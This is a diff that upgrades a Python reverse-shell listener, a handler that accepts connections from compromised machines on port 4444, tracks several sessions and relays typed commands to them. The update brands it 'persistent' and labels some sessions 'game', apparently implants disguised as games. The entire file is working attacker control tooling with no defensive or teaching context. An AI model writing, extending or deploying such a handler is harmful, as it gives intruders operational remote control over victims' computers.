@@ -2,57 +2,136 @@ import socket
 import threading
 import os
 import sys
+import time
 
 HOST = '0.0.0.0'
 PORT = 4444
 
-# Store active shells
 active_shells = []
 shell_counter = 0
+lock = threading.Lock()
 
 def handle_client(conn, addr, shell_id):
     global active_shells
-    print(f"\n[!] SHELL #{shell_id} CONNECTED from {addr}")
-    print(f"[!] Type 'shell {shell_id}' to switch to this shell")
-    print(f"[!] Type 'list' to see all shells\n")
     
-    # Add to active shells
-    active_shells.append({
-        'id': shell_id,
-        'conn': conn,
-        'addr': addr,
-        'active': True
-    })
+    # Try to identify shell type from first message
+    shell_type = "unknown"
+    try:
+        conn.settimeout(2)
+        first_data = conn.recv(1024).decode()
+        if "PERSISTENT" in first_data:
+            shell_type = "persistent"
+        elif "GAME" in first_data:
+            shell_type = "game"
+    except:
+        pass
+    
+    with lock:
+        active_shells.append({
+            'id': shell_id,
+            'conn': conn,
+            'addr': addr,
+            'type': shell_type,
+            'buffer': '',
+            'last_seen': time.time()
+        })
+    
+    print(f"\n[!] SHELL #{shell_id} [{shell_type}] from {addr}")
     
     try:
+        conn.settimeout(1.0)
+        
         while True:
-            # Don't handle input here - main thread handles switching
-            # Just keep connection alive and receive data
-            conn.settimeout(1)
             try:
-                data = conn.recv(4096)
+                data = conn.recv(65536)
                 if not data:
                     break
-                # Data will be shown when this shell is active
+                
+                with lock:
+                    for shell in active_shells:
+                        if shell['id'] == shell_id:
+                            shell['buffer'] += data.decode('utf-8', errors='ignore')
+                            shell['last_seen'] = time.time()
+                            break
+                
             except socket.timeout:
                 continue
             except:
                 break
+                
     except:
         pass
     finally:
-        # Remove from active shells
-        active_shells = [s for s in active_shells if s['id'] != shell_id]
+        with lock:
+            active_shells = [s for s in active_shells if s['id'] != shell_id]
         conn.close()
         print(f"[*] Shell #{shell_id} closed")
 
 def list_shells():
-    if not active_shells:
-        print("No active shells")
+    with lock:
+        if not active_shells:
+            print("No active shells")
+            return
+        print("\nActive Shells:")
+        for shell in active_shells:
+            print(f"  #{shell['id']} [{shell['type']}] - {shell['addr'][0]}:{shell['addr'][1]}")
+
+def send_to_shell(shell_id, command):
+    with lock:
+        shell = next((s for s in active_shells if s['id'] == shell_id), None)
+    
+    if not shell:
+        return None, "Shell not found"
+    
+    try:
+        shell['buffer'] = ''
+        shell['conn'].send((command + "\n").encode())
+        time.sleep(2)
+        
+        response = shell['buffer']
+        shell['buffer'] = ''
+        
+        if not response:
+            return None, "No response"
+        
+        return response, None
+    except Exception as e:
+        return None, str(e)
+
+def interactive_shell(shell_id):
+    print(f"\n[+] Interactive shell #{shell_id}")
+    print("[+] Type 'exit' to return\n")
+    
+    response, error = send_to_shell(shell_id, "echo READY")
+    if error:
+        print(f"[-] Shell not responding: {error}")
         return
-    print("\nActive Shells:")
-    for shell in active_shells:
-        print(f"  #{shell['id']} - {shell['addr'][0]}:{shell['addr'][1]}")
+    
+    while True:
+        try:
+            cmd = input(f"shell#{shell_id}> ").strip()
+            
+            if cmd.lower() in ['exit', 'back']:
+                break
+            
+            if not cmd:
+                continue
+            
+            response, error = send_to_shell(shell_id, cmd)
+            
+            if error:
+                print(f"[-] {error}")
+                if "not found" in error:
+                    break
+            else:
+                if response:
+                    print(response, end='')
+                else:
+                    print("[OK]")
+                    
+        except KeyboardInterrupt:
+            print("\n[+] Returning...")
+            break
 
 def main_listener():
     global shell_counter
@@ -64,107 +143,96 @@ def main_listener():
         server.bind((HOST, PORT))
         server.listen(10)
         
-        print("=" * 50)
-        print("ADVANCED LISTENER READY")
-        print("=" * 50)
-        print(f"Listen on: 0.0.0.0:{PORT}")
-        print(f"Your IP: {socket.gethostbyname(socket.gethostname())}")
-        print("\nCommands:")
-        print("  list              - Show all active shells")
-        print("  shell <id>        - Switch to specific shell")
-        print("  broadcast <cmd>   - Send command to all shells")
-        print("  exit              - Close current shell")
-        print("  quit              - Exit listener")
-        print("=" * 50)
+        hostname = socket.gethostname()
+        local_ip = socket.gethostbyname(hostname)
         
-        # Start connection acceptor thread
+        print("=" * 70)
+        print("🔴 PERSISTENT SHELL LISTENER V5 - TRUE PERSISTENCE")
+        print("=" * 70)
+        print(f"📡 Listening on: 0.0.0.0:{PORT}")
+        print(f"🌐 Your IP: {local_ip}")
+        print("\n📋 Commands:")
+        print("  list              - Show active shells")
+        print("  use <id>          - Interact with shell")
+        print("  kill <id>         - Kill shell")
+        print("  quit              - Exit")
+        print("=" * 70)
+        
         def accept_connections():
             global shell_counter
             while True:
-                conn, addr = server.accept()
-                shell_counter += 1
-                thread = threading.Thread(target=handle_client, args=(conn, addr, shell_counter))
-                thread.daemon = True
-                thread.start()
+                try:
+                    conn, addr = server.accept()
+                    shell_counter += 1
+                    thread = threading.Thread(
+                        target=handle_client, 
+                        args=(conn, addr, shell_counter),
+                        daemon=True
+                    )
+                    thread.start()
+                except:
+                    pass
         
-        acceptor = threading.Thread(target=accept_connections, daemon=True)
-        acceptor.start()
-        
-        # Main command loop
-        current_shell = None
+        threading.Thread(target=accept_connections, daemon=True).start()
         
         while True:
             try:
-                if current_shell:
-                    cmd = input(f"shell#{current_shell}> ")
-                else:
-                    cmd = input("listener> ")
+                cmd = input("\nlistener> ").strip()
                 
-                if cmd.lower() == 'quit':
+                if not cmd:
+                    continue
+                    
+                parts = cmd.split()
+                command = parts[0].lower()
+                
+                if command == 'quit':
                     break
                     
-                elif cmd.lower() == 'list':
+                elif command == 'list':
                     list_shells()
                     
-                elif cmd.lower().startswith('shell '):
+                elif command == 'kill':
+                    if len(parts) < 2:
+                        print("Usage: kill <id>")
+                        continue
                     try:
-                        shell_id = int(cmd.split()[1])
-                        target = next((s for s in active_shells if s['id'] == shell_id), None)
-                        if target:
-                            current_shell = shell_id
-                            print(f"Switched to shell #{shell_id}")
+                        kill_id = int(parts[1])
+                        with lock:
+                            shell = next((s for s in active_shells if s['id'] == kill_id), None)
+                        if shell:
+                            shell['conn'].close()
+                            print(f"[+] Shell #{kill_id} killed")
                         else:
-                            print(f"Shell #{shell_id} not found")
+                            print(f"[-] Shell #{kill_id} not found")
                     except:
-                        print("Usage: shell <id>")
+                        print("Invalid ID")
                         
-                elif cmd.lower() == 'exit':
-                    if current_shell:
-                        target = next((s for s in active_shells if s['id'] == current_shell), None)
+                elif command == 'use':
+                    if len(parts) < 2:
+                        print("Usage: use <id>")
+                        continue
+                    try:
+                        shell_id = int(parts[1])
+                        with lock:
+                            target = next((s for s in active_shells if s['id'] == shell_id), None)
+                        
                         if target:
-                            target['conn'].send(b'exit\n')
-                            current_shell = None
+                            interactive_shell(shell_id)
                         else:
-                            current_shell = None
-                    else:
-                        print("No active shell")
+                            print(f"[-] Shell #{shell_id} not found")
+                    except:
+                        print("Invalid ID")
                         
-                elif cmd.lower().startswith('broadcast '):
-                    bcast_cmd = cmd[10:]
-                    for shell in active_shells:
-                        try:
-                            shell['conn'].send(bcast_cmd.encode() + b'\n')
-                        except:
-                            pass
-                    print(f"Broadcast sent to {len(active_shells)} shells")
+                else:
+                    print("Unknown command")
                     
-                elif current_shell:
-                    # Send command to current shell
-                    target = next((s for s in active_shells if s['id'] == current_shell), None)
-                    if target:
-                        target['conn'].send(cmd.encode() + b'\n')
-                        # Wait for response
-                        target['conn'].settimeout(5)
-                        try:
-                            response = target['conn'].recv(4096).decode()
-                            print(response, end='')
-                        except:
-                            print("[!] No response or shell disconnected")
-                            current_shell = None
-                    else:
-                        print(f"Shell #{current_shell} no longer active")
-                        current_shell = None
-                        
             except KeyboardInterrupt:
                 break
-            except Exception as e:
-                print(f"Error: {e}")
                 
     except Exception as e:
         print(f"Error: {e}")
     finally:
         server.close()
-        print("\nListener stopped")
 
 if __name__ == "__main__":
     main_listener()
